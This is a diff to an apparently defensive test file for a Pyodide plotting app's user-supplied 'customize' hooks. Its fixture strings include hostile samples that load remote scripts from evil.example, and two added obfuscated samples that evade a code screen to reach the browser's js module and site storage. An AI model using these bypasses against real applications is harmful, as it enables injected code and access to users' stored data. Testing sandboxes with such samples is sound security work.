@@ -26,6 +26,9 @@ const hooks = [
   "import js\ndef customize(fig, axes, df):\n    js.setTimeout('import(\"https://evil.example/t.js\")', 0)\n",
   "from pyodide.code import run_js\ndef customize(fig, axes, df):\n    run_js('import(\"https://evil.example/runjs.js\")')\n",
   "import js\ndef customize(fig, axes, df):\n    js.XMLHttpRequest.new().open('GET','https://evil.example/x')\n",
+  // the security review's way past the code screen (screened in the app, not here): reach js, then the site's storage
+  "from matplotlib import cbook\nfrom matplotlib.cbook import operator\ndef customize(fig, axes, df):\n    g = operator.attrgetter\n    b = g('modu'+'les')(g('s'+'ys')(cbook))['built'+'ins']\n    J = g('_'+'_import_'+'_')(b)('j'+'s')\n    J.navigator.storage.getDirectory()\n",
+  "from matplotlib import cbook\nfrom matplotlib.cbook import operator\ndef customize(fig, axes, df):\n    g = operator.attrgetter\n    b = g('modu'+'les')(g('s'+'ys')(cbook))['built'+'ins']\n    J = g('_'+'_import_'+'_')(b)('j'+'s')\n    J.indexedDB.open('x')\n",
   "def customize(fig, axes, df):\n    axes[0].set_title('SAFE')\n",
 ];
 const out = await page.evaluate(async ({ hooks, csv, scsv, d1, d2, spec, km }) => {
